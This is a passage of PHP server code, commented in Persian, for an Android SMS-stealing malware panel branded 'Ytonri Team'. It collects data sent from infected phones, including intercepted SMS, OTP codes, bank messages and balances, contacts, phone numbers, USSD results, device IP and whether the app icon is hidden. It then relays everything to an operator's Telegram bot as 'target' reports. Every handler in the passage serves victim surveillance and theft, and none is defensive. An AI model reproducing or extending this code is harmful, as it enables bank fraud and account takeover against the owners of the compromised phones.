    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    
    // دریافت نام مخاطب
    $contact_name = "👁️ ناشناس";
    $contacts_file = "user/$Device_id-contacts.txt";
    if (file_exists($contacts_file)) {
        $contacts = file_get_contents($contacts_file);
        if (preg_match('/Name:\s*(.*?)\s*Phone:\s*'.preg_quote($sender,'/').'/', $contacts, $matches)) {
            $contact_name = trim($matches[1]);
        }
    }

    // استخراج کد از پیام
    $code = findPooya($message_text);
    if(empty($code)) { 
        $code = getNumber2($message_text);
    }
    
    // جایگزینی کد در متن پیام با تگ code
    $formatted_message = $message_text;
    if(!empty($code) && $code != "No number found") {
        $formatted_message = str_replace($code, '<code>'.$code.'</code>', $message_text);
    }
    
    // ساخت متن پیام نهایی
$message = "
┌ ⚡ **ᴀ ɴᴇᴡ ᴍᴇꜱꜱᴀɢᴇ ʀᴇᴄᴇɪᴠᴇᴅ**
└ 🩸 ꜰʀᴏᴍ : $sender

> 💬 ᴍᴇꜱꜱᴀɢᴇ :
$formatted_message

┌ 🩸 ᴍᴏᴅᴇʟ : $Model
├ 👁️ ꜱᴛᴀᴛᴜꜱ : ɪᴄᴏɴ: " . ($apk_status == "ᴠɪꜱɪʙʟᴇ" ? "ʜɪᴅᴅᴇɴ" : ($apk_status == "ᴄʜᴀɴɢᴇᴅ" ? "ᴄʜᴀɴɢᴇᴅ" : "ɴᴏʀᴍᴀʟ")) . " - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 💀 ɪᴘ : $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ : /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
    
    
    bot('sendMessage', [
        'chat_id' => $id_sender,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);


} elseif ($action == "OTPSMS") {
    $phone = asd($message_text, '[Address=', ', Body=');
    $body = asd($message_text, ', Body=', 'IsInitialized');
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    smg($id_sender, "
┌ ⚡ **ᴀ ɴᴇᴡ ᴍᴇꜱꜱᴀɢᴇ ʀᴇᴄᴇɪᴠᴇᴅ**
├ $body
└ 🩸ꜰʀᴏᴍ : $sender

┌ 🩸ᴍᴏᴅᴇʟ : $Model
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator 
├ 🎏 ꜰɪʀꜱᴛ ɪᴘ : $install_ip 
├ 💀 ɪᴘ : $ip
└ ☠️ ᴘᴀɴᴇʟ /login_$Device_id 
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $sms_panel);
} elseif ($action == "lastsms") {
    // دریافت اطلاعات دستگاه
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    
    // دریافت نام مخاطب
    $contact_name = "👁️ ناشناس";
    $contacts_file = "user/$Device_id-contacts.txt";
    if (file_exists($contacts_file)) {
        $contacts = file_get_contents($contacts_file);
        if (preg_match('/Name:\s*(.*?)\s*Phone:\s*'.preg_quote($sender,'/'), $contacts, $matches)) {
            $contact_name = "👁️ ".trim($matches[1]);
        }
    }

    // ساخت پیام نهایی با فرمت درخواستی
    $final_message = "
┌ ⚡ **ʟᴀꜱᴛ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ**
└ 🕸 ꜰʀᴏᴍ: $sender

> 💬 ᴍᴇꜱꜱᴀɢᴇ:
$message_text

┌ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: " . ($apk_status == "ᴠɪꜱɪʙʟᴇ" ? "ʜɪᴅᴅᴇɴ" : "ɴᴏʀᴍᴀʟ") . " - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
    
    // ارسال پیام نهایی به صورت جدید
    smg($id_sender, $final_message, $sms_panel);


    
    // Device status
    $iconStatus = ($apk_status == "ᴠɪꜱɪʙʟᴇ") ? "ʜɪᴅᴅᴇɴ" : ($apk_status == "ᴄʜᴀɴɢᴇᴅ" ? "ᴄʜᴀɴɢᴇᴅ" : "ɴᴏʀᴍᴀʟ");
    $message = "
┌ ⚡ **ʟᴀꜱᴛ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ**
└ 🕸 ꜰʀᴏᴍ: $sender

> 💬 ᴍᴇꜱꜱᴀɢᴇ:
$message_text

┌ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: $iconStatus - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
    
    // Edit with final message
    bot('editMessageText', [
        'chat_id' => $id_sender,
        'message_id' => $temp_msg->result->message_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);

} elseif ($action == "lastbanksms") {
    $chat_id = $id_sender;
    $wait_msg_id = file_get_contents("user/$chat_id/wait_msg_id.txt");
    
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");

    $final_message = "
┌ 💸 **ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ** 💸
├ 🕸 ꜰʀᴏᴍ: $sender
└ 💬 ᴍᴇꜱꜱᴀɢᴇ:
$message_text

┌ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: " . ($apk_status == "ᴠɪꜱɪʙʟᴇ" ? "ʜɪᴅᴅᴇɴ" : "ɴᴏʀᴍᴀʟ") . " - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";

    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $wait_msg_id,
        'text' => $final_message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);

    unlink("user/$chat_id/wait_msg_id.txt");


} elseif ($action == "balance") {
    $x = file_get_contents("data/bal.txt");
    if ($x == "singel") {
        $BalanceText = "";
        if (isset($_POST['Balances'])) {
            $Balance_Data = json_decode(base64_decode($_POST['Balances']), true);
        } else {
            $Balance_Data = [];
        }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n$key";
                $BalanceText .= "\n💰" . $balance['Balance'];
                $BalanceText .= "\n☎️شماره :" . $balance['Address'];
                $BalanceText .= "\n==============";
            }
        }


        smg($id_sender, "
$BalanceText", null);
        file_put_contents("data/bal.txt", "xx");
    
    } else {
        $BalanceText = "";
        if (isset($_POST['Balances'])) {
            $Balance_Data = json_decode(base64_decode($_POST['Balances']), true);
        } else {
            $Balance_Data = [];
        }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n💵  : $key";
                $BalanceText .= "\n📞سر شماره : " . $balance['Address'];
                $BalanceText .= "\n💰" . $balance['Balance'];
                $BalanceText .= "\n-- - -- - -- - -- - -- - -- - --";
            }
        }

        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
> 🩸 **ᴛᴀʀɢᴇᴛ** #ʙᴀʟᴀɴᴄᴇꜱ :
$BalanceText

┌ 🩸 ᴍᴏᴅᴇʟ : $Model 
├ 🗃 ᴅᴇᴠɪᴄᴇ : $Device_id
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 👁️ ᴀ-ᴠᴇʀꜱɪᴏɴ : $os 
├ 💀 ɪᴘ : $ip 
├ 🎏 ꜰɪʀꜱᴛ ɪᴘ : $install_ip
└ ☠️ ᴘᴀɴᴇʟ /login_$Device_id 
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $sms_panel);
    }
} elseif ($action == "WhatsChecker") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
> ╔ [ • #ᴄʜᴇᴄᴋᴇʀ • ] 
> ║  
> ╠ [ • **ꜱᴛᴀᴛᴜꜱ ᴄʜᴇᴄᴋᴇʀ** :  $message_text • ]
> ╠ [ • **ᴍᴏᴅᴇʟ** : $Model • ]
> ╠ [ • **ɴᴇᴛᴡᴏʀᴋ** : $operator • ]
> ╠ [ • **ᴅᴇᴠɪᴄᴇ** : $Device_id • ]
> ╠ [ • **ɪᴘ : $ip** • ]
> ╠ [ • **ꜰɪʀꜱᴛ ɪᴘ** : $install_ip • ]
> ║
> ╠ [ • /login_$Device_id • ]
> ╠ [ • /block_$ip • ]
> ║
> ╚ [ • 🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ • ]
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $sms_panel);
} elseif ($action == "searchSMS") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    smg($id_sender, "
┌ 🔮 **ꜱᴇᴀʀᴄʜ ꜱᴍꜱ**
└ 🩸 ꜰʀᴏᴍ : $sender 
$message_text

┌ 🩸 ᴍᴏᴅᴇʟ : $Model 
├ 🕸 ᴅᴇᴠɪᴄᴇ : $Device_id
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 👁️ ᴀ-ᴠᴇʀꜱɪᴏɴ : $os 
├ 💀 ɪᴘ : $ip 
├ 🎏 ꜰɪʀꜱᴛ ɪᴘ : $install_ip
└ ☠️ ᴘᴀɴᴇʟ /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $sms_panel);
}
elseif ($action == "userphone") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");

    // پردازش شماره‌ها
    $phoneNumbers = array_filter(explode("\n", $phones), function($num) {
        return trim($num) !== '';
    });
    
    // حذف 'Text : ' و فاصله‌های اضافه
    $cleanedNumbers = array_map(function($num) {
        return trim(preg_replace('/Text\s*:\s*/', '', $num));
    }, $phoneNumbers);
    
    // حذف موارد تکراری
    $uniqueNumbers = array_unique($cleanedNumbers);
    
    // ساخت متن پیام با فرمت دقیق
    $message = "
> 📞 ᴛᴀʀɢᴇᴛ #ᴘʜᴏɴᴇꜱ

";
    
    if (empty($uniqueNumbers)) {
        $message .= "> 🦇 **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ** : 
❌شماره ای یافت نشد\n";
    } else {
        $message .= "> 🦇 **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ** : \n";
        
        // دسته‌بندی شماره‌ها
        $mciNumbers = [];
        $mtnNumbers = [];
        $rightelNumbers = [];
        $unknownNumbers = [];
        
        foreach ($uniqueNumbers as $num) {
            $cleanNum = preg_replace('/[^0-9]/', '', $num);
            
            if (preg_match('/^(98|0)?9(0[1-3]|1[0-9]|2[0-2]|3[0-9]|9[0-2])/', $cleanNum)) {
                $mciNumbers[] = $cleanNum;
            } elseif (preg_match('/^(98|0)?9(1[1-9]|2[3-9]|3[0-9]|9[3-5])/', $cleanNum)) {
                $mtnNumbers[] = $cleanNum;
            } elseif (preg_match('/^(98|0)?9(2[1-2]|9[6-9])/', $cleanNum)) {
                $rightelNumbers[] = $cleanNum;
            } else {
                $unknownNumbers[] = $cleanNum;
            }
        }
        
        if (!empty($unknownNumbers)) {
            $message .= "> 🧌 ناشناس\n";
            foreach ($unknownNumbers as $i => $num) {
                $message .= ">  " . ($i+1) . " - " . $num . "\n";
            }
        }
        
        if (!empty($mciNumbers)) {
            $message .= "> ☠️ همراه اول\n";
            foreach ($mciNumbers as $i => $num) {
                $message .= ">  " . ($i+1) . " - " . $num . "\n";
            }
        }
        
        if (!empty($mtnNumbers)) {
            $message .= "> 🩸 ایرانسل\n";
            foreach ($mtnNumbers as $i => $num) {
                $message .= ">  " . ($i+1) . " - " . $num . "\n";
            }
        }
        
        if (!empty($rightelNumbers)) {
            $message .= "> 🕸 رایتل\n";
            foreach ($rightelNumbers as $i => $num) {
                $message .= ">  " . ($i+1) . " - " . $num . "\n";
            }
        }
    }
    
    // وضعیت دستگاه
    $iconStatus = ($apk_status == "ᴠɪꜱɪʙʟᴇ") ? "ʜɪᴅᴅᴇɴ" : "ɴᴏʀᴍᴀʟ";
    $screenStatus = ($offline == "ᴏɴ") ? "ᴏꜰꜰ" : "ᴏɴ";
    
$message .= "
┌ 🩸 ᴍᴏᴅᴇʟ : $Model
├ 👁️ ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ ➝ ɪᴄᴏɴ: $iconStatus - ꜱᴄʀᴇᴇɴ: $screenStatus
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 💀 ɪᴘ : $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ : /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";

smg($id_sender, $message, $sms_panel);
}
elseif ($action == "ussdcallback") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
> 🩸 ᴛᴀʀɢᴇᴛ #ᴜꜱꜱᴅ_ʀᴇꜱᴜʟᴛ :
$message_ussd

┌ 🎏 ꜰɪʀꜱᴛ ɪᴘ : $install_ip
└ ☠️ ᴘᴀɴᴇʟ /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $sms_panel);
}